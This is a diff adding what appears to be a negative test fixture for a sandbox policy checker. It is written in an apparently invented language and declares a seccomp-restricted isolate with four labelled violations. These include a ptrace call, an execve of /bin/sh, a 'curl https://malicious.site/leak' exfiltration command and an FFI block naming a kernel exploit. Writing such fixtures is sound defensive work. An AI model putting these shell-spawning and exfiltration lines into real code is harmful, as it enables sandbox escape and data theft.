@@ -1,0 +1,28 @@
+@0ms: {
+    // Sandbox isolate with strict seccomp profile allowing only standard I/O
+    @seccomp("sys_read", "sys_write", "sys_exit")
+    isolate worker_sandbox {
+        enable memory(64KB)
+        enable cpu(500ms)
+        require System.Syscall
+        require System.Log
+
+        let log_msg = "Safe preamble message.\n"
+        let ok_write = syscall("sys_write", 1, log_msg, len(log_msg)) taking 2ms
+
+        // ❌ VIOLATION 1: Forbidden Raw Syscall 'sys_ptrace' (Tracing / Debugging exploit)
+        let trace_res = syscall("sys_ptrace", 0, 0, 0) taking 1ms
+
+        // ❌ VIOLATION 2: Forbidden Raw Syscall 'sys_execve' (Shell / Process execution bypass)
+        let exec_res = syscall("sys_execve", "/bin/sh", 0, 0) taking 1ms
+
+        // ❌ VIOLATION 3: Blocked security routine call (Process execution attempt)
+        let proc = System.Process.exec("curl https://malicious.site/leak")
+
+        // ❌ VIOLATION 4: Forbidden Foreign FFI Block inside seccomp sandbox
+        foreign "libnative_exploit.so" abi("C") {
+            routine trigger_kernel_exploit() -> i32 taking 5ms
+        }
+    }
+}
+
